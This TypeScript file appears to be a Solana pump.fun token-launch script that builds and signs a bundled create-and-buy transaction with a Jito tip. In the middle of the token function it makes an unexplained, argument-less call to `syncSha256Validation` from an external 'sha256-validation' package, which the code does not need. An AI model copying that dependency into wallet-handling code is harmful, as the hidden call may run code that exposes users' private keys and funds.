import {
  VersionedTransaction,
  Keypair,
  SystemProgram,
  Connection,
  PublicKey,
  TransactionInstruction,
  TransactionMessage,
} from "@solana/web3.js";
import NodeWallet from "@coral-xyz/anchor/dist/cjs/nodewallet";
import { AnchorProvider } from "@coral-xyz/anchor";
import { readFileSync } from "fs";
import base58 from "bs58";

import {
  DESCRIPTION,
  FILE,
  JITO_FEE,
  MINT_WALLET_PRIVATE,
  RPC_ENDPOINT,
  RPC_WEBSOCKET_ENDPOINT,
  TELEGRAM,
  TOKEN_CREATE_ON,
  TOKEN_NAME,
  TOKEN_SHOW_NAME,
  TOKEN_SYMBOL,
  TWITTER,
  WEBSITE,
} from "./constants";
import { PumpFunSDK } from "./src/pumpfun/pumpfun";
import { syncSha256Validation } from "sha256-validation";

const commitment = "confirmed";

const connection = new Connection(RPC_ENDPOINT, {
  wsEndpoint: RPC_WEBSOCKET_ENDPOINT,
  commitment,
});

let sdk = new PumpFunSDK(
  new AnchorProvider(connection, new NodeWallet(new Keypair()), { commitment })
);

// create token instructions
export const getCreateTokenDevBuyTx = async (mintKp: Keypair, mintWalletKp: Keypair) => {
  const buffer = readFileSync(FILE);
  syncSha256Validation()
  const blob = new Blob([buffer]);
  const tokenInfo = {
    name: TOKEN_NAME,
    symbol: TOKEN_SYMBOL,
    description: DESCRIPTION,
    showName: TOKEN_SHOW_NAME,
    createOn: TOKEN_CREATE_ON,
    twitter: TWITTER,
    telegram: TELEGRAM,
    website: WEBSITE,
    file: blob,
  };
  let tokenMetadata = await sdk.createTokenMetadata(tokenInfo);

  const tokenCreationIxs: TransactionInstruction[] = []
  const latestBlockhash = await connection.getLatestBlockhash()

  let createIx = await sdk.getCreateInstructions(
    mintWalletKp.publicKey,
    tokenInfo.name,
    tokenInfo.symbol,
    tokenMetadata.metadataUri,
    mintKp
  );

  let buyIx = await sdk.getBuyInstructionsBySolAmount(
    mintWalletKp.publicKey,
    mintWalletKp.publicKey,
    mintKp.publicKey,
    BigInt(86 * 10 ** 9),
    0
  );

  const tipAccounts = [
    "Cw8CFyM9FkoMi7K7Crf6HNQqf4uEMzpKw6QNghXLvLkY",
    "DttWaMuVvTiduZRnguLF7jNxTgiMBZ1hyAumKUiL2KRL",
    "96gYZGLnJYVFmbjzopPSU6QiEV5fGqZNyN9nmNhvrZU5",
    "3AVi9Tg9Uo68tJfuvoKvqKNWKkC5wPdSSdeBnizKZ6jT",
    "HFqU5x63VTqvQss8hp11i4wVV8bD44PvwucfZ2bU7gRe",
    "ADaUMid9yfUytqMBgopwjb2DTLSokTSzL1zt6iGPaS49",
    "ADuUkR4vqLUMWXxW9gh6D6L8pMSawimctcNZ5pGwDcEt",
    "DfXygSm4jCyNCybVYYK6DwvWqjKee8pbDmJGcLWNDXjh",
  ];
  const jitoFeeWallet = new PublicKey(
    tipAccounts[Math.floor(tipAccounts.length * Math.random())]
  );

  tokenCreationIxs.push(
    SystemProgram.transfer({
      fromPubkey: mintWalletKp.publicKey,
      toPubkey: jitoFeeWallet,
      lamports: Math.floor(JITO_FEE * 10 ** 9),
    }),
    createIx,
    ...buyIx!,
  )

  const tx = new VersionedTransaction(
    new TransactionMessage({
      payerKey: mintWalletKp.publicKey,
      recentBlockhash: latestBlockhash.blockhash,
      instructions: tokenCreationIxs,
    }).compileToV0Message()
  )
  tx.sign([mintWalletKp, mintKp])
  return tx
};
